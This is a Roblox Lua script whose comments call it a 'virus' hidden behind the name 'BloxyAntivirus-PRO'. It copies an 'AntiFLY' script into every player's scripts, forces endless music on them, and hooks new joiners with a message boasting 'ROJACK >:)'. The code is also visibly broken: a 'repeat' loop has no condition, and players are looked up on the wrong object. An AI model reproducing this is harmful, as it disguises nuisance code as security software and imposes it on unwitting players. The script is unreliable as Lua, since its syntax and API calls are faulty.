--The 'BloxyAntivirus-PRO' = THE R&J Executor!! (BloxyAntiVirus-PRO is the mask of R&J Executor!


local playerservice = game:GetService("Players")
local players = playerservice:GetPlayers()


repeat
	
	for _, player in ipairs(players) do
		
		
		
		Instance.new("Sound", player.PlayerGui)
		player.PlayerGui.Sound.Name = "Sound22"
		
		game.ReplicatedFirst.AntiFLY.Parent = game.Workspace
		wait()
		
		local aa = game.Workspace.AntiFLY:Clone()
		
		aa.Parent = game.ReplicatedFirst
		game.Workspace.AntiFLY:Clone(game.Workspace.AntiFLY)
		game.Workspace.AntiFLY.Parent = game.ReplicatedFirst
		game.ReplicatedFirst.AntiFLY.Parent = player.PlayerScripts
		player.PlayerScripts.AntiFLY.Disabled = false
		-- <<This is a music >>
		Instance.new("Sound", player.PlayerGui)
		
		
		local login = 6258085236
		local music_1 = 1837807891
		local music_2 = 9048538224
		local music_3 = 1839491081
		local music_4 = 9039268971
		local music_5 = 1837755509
		local music_6 = 1842559618
		local music_7 = 1837301451
		local volume = 1
		local rr = 6664033781
		local R = player.PlayerGui.Sound
		
		while true  do
			R.SoundId = "rbxassetid://"..login
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_1
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..login
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_2
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..login
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_3
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..login
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_4
			R.Volume = volume
			R:Play()
			wait(17)
			player.PlayerGui.Sound22.SoundId = "rbxassetid://"..rr
			player.PlayerGui.Sound22:Play()
			wait(8)
			player.PlayerGui.Sound22:Play()
			wait(10)
			player.PlayerGui.Sound22:Play()
			wait(12)
			player.PlayerGui.Sound22:Play()
			wait(7)
			player.PlayerGui.Sound22:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..login
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_5
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_6
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
			R.SoundId = "rbxassetid://"..music_7
			R.Volume = volume
			R:Play()
			R.Ended:Wait()
		end
	--]]
	wait()
	end
	wait()
until

-- MORE MORE VIRUS!!!!!!!!!!!
game.Players.PlayerAdded:Connect(function(player)
	local PLAYERS = game:GetService("Players")
	local PLAYER = PLAYERS:GetPlayers()

	local FROM = game.Workspace.AntiFLY
	local TO = FROM:Clone()
	
	TO.Parent = PLAYER.PlayerScripts
	print("Sucesfull loaded Player Loader!") -- ''''SUCESFULL LOADED ROJACK >:) '''
end)

